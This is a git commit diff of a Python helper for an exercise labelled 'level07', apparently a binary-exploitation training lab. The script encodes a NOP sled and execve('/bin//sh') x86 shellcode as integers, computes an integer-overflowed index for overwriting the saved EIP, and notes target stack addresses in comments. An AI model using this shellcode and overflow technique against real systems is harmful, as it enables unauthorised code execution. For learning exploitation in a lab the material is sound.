f6af3de610d026e002b0e8d9b846e1a69dc83352
gvannest <gautier.vanneste42@gmail.com>
2020-10-16 19:37:39 +0200

    toujours galere

--- level07/script.py
+++ level07/script.py
@@ -2,18 +2,20 @@
 def main():
     shellcode = b'\x90'*17 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
     zero = 4294967296
-    i = 1
+    i = 0
     j = 0
-    while i - 1 < len(shellcode):
+    while i < len(shellcode):
         if i % 4 == 0 :
-            print(int.from_bytes(shellcode[i - 1 : i + 3], byteorder='little', signed=False))
+            print(int.from_bytes(shellcode[i : i + 4], byteorder='little', signed=False))
             if j % 3 == 0:
-                print(zero + j)
+                print((zero + j * 4) / 4)
             else:
                 print(j)
             print("------------")
             j+=1
         i+=1
+
+    print("idx of $eip : ", (114 * 4 + 4294967296) / 4)
 
 
 
@@ -21,3 +23,9 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+# idx = (114 * 4 + 4294967296) / 4 (=0 du overflow)
+
+# value = 4294956300 = 0xffffd50c = dans le NOP
+
+# other value 4294956292 = 0xffffd504
